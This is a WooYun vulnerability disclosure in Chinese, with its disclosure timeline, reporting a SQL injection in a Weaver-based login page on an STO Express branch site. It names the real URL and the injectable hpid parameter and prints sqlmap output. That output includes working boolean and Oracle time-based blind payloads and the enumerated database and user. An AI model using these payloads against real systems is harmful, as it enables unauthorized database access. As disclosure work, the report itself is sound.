wybug_title: 申通快递某分站存在SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-08-17：	细节已通知厂商并且等待厂商处理中									2015-08-17：	厂商已经确认，细节仅向厂商公开									2015-08-27：	细节向核心白帽子及相关领域专家公开									2015-09-06：	细节向普通白帽子公开									2015-09-16：	细节向实习白帽子公开									2015-10-01：	细节向公众公开  简要描述： SQL注入 详细说明：  http://cos.sto.cn/login/Login.jsp?logintype=1泛微的系统

注入点
http://cos.sto.cn/homepage/LoginHomepage.jsp?hpid=52*&isfromportal=1

sqlmap identified the following injection points with a total of 81 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://cos.sto.cn:80/homepage/LoginHomepage.jsp?hpid=81 AND 2763=2763&opt=privew---web application technology: JSPback-end DBMS: Oracle

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: http://cos.sto.cn:80/homepage/LoginHomepage.jsp?hpid=52 AND 9389=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(118)||CHR(104)||CHR(80),5)&isfromportal=1---web application technology: JSPback-end DBMS: Oracleavailable databases [1]:[*] ECOLOGY

current user:    'ECOLOGY'current schema (equivalent to database on Oracle):    'ECOLOGY'
   漏洞证明：  http://cos.sto.cn/login/Login.jsp?logintype=1泛微的系统
